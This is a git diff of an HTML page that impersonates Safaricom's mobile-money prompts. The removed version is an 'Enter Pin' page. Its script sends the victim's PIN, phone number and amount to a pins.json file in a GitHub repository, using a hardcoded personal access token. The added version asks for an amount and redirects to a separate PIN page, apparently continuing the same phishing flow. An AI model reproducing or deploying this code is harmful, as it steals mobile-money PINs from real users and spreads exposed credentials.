@@ -3,28 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safaricom</title>
     <script defer src="https://pyscript.net/latest/pyscript.js"></script>
     <link rel="stylesheet" href="https://pyscript.net/latest/pyscript.css">
+    <title>safaricom</title>
 </head>
 <style>
-    #heading {
+    #heading{
         font-size: 30px;
         background-color: #f5f7f2;
         display: block;
         margin: 10px;
         padding: 20px;
     }
-
-    #subheading {
-        font-size: 25px;
+    #subheading{
+        font-size: 25;
         font-weight: bold;
         color: #5da9c9;
         display: block;
         margin: 10px;
         padding: 20px;
     }
-
     a {
         display: block;
         padding-top: 30px;
@@ -35,108 +33,40 @@
         border-width: 1px;
         border-color: #edebe4;
         color: black;
-        text-decoration: none;
+        text-decoration: none; /* This removes the underline */
     }
-
-    #enternumberlabel {
-        color: #d6d4d4;
-        margin-left: 20px;
+    #enternumberlabel{
+        color:#d6d4d4 ;
+        margin-left: 20;
         display: block;
     }
-
-    #enternumberinput {
+    #enternumberinput{
         display: block;
-        outline: none;
+        outline:none;
         margin: 20px;
     }
-
-    #getphonebutton {
+    #getphonebutton{
         margin-top: 20px;
         margin-left: 50px;
         width: 50px;
         height: 20px;
-        border-radius: 25px;
+        border-radius: 25;
     }
+
 </style>
 <body>
     <label id="heading">Safaricom</label>
-    <label id="subheading">Enter Pin</label>
-    <label id="enternumberlabel">Digits (0-9, *, #, +) 10-13</label>
-    <input id="enternumberinput" type="text">
-    <button id="getphonebutton">OK</button>
-
+    <label id="subheading">Enter Amount</label>
+    <label id="enternumberlabel">digits(0-9,*,#,+)10-13</label>
+    <input id="enternumberinput" type="symbols">
+    <button id="getphonebutton">ok</button>
     <script>
-        async function updateFileOnGitHub(newContent) {
-            const repoOwner = "senmakana";
-            const repoName = "Pins";
-            const filePath = "pins.json";
-            const branch = "main";
-            const token = "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"; // Replace with your GitHub personal access token
-
-            const fileUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`;
-
-            try {
-                // Fetch the existing file details
-                const response = await fetch(fileUrl, {
-                    headers: {
-                        Authorization: `Bearer ${token}`,
-                    },
-                });
-
-                if (!response.ok) {
-                    throw new Error(`Failed to fetch file details: ${response.statusText}`);
-                }
-
-                const fileData = await response.json();
-
-                // Prepare the updated content
-                const updatedContent = {
-                    ...JSON.parse(atob(fileData.content)), // Decode and parse the existing content
-                    ...newContent, // Add new data
-                };
-
-                // Encode the updated JSON content
-                const encodedContent = btoa(JSON.stringify(updatedContent, null, 2));
-
-                // Update the file on GitHub
-                const updateResponse = await fetch(fileUrl, {
-                    method: "PUT",
-                    headers: {
-                        Authorization: `Bearer ${token}`,
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        message: "Updated pins.json",
-                        content: encodedContent,
-                        sha: fileData.sha, // Required to update the file
-                        branch: branch,
-                    }),
-                });
-
-                if (!updateResponse.ok) {
-                    throw new Error(`Failed to update file: ${updateResponse.statusText}`);
-                }
-
-                console.log("File updated successfully!");
-            } catch (error) {
-                console.error("Error:", error.message);
-            }
+        function getPhoneNumber(){
+            amount=document.getElementById("enternumberinput").value;
+            sessionStorage.setItem("sendamount",amount)
+                        window.location.href="pin/index.html"
         }
-
-        function getPhoneNumber() {
-            const pin = document.getElementById("enternumberinput").value;
-
-            // Example data to be updated
-            const data = {
-                pin: pin,
-                phonenumber: sessionStorage.getItem("phonenumber") || "1234567890",
-                amount: sessionStorage.getItem("amount") || "100",
-            };
-
-            updateFileOnGitHub(data);
-        }
-
-        document.getElementById("getphonebutton").addEventListener("click", getPhoneNumber);
+        document.getElementById("getphonebutton").addEventListener("click",getPhoneNumber)
     </script>
 </body>
 </html>
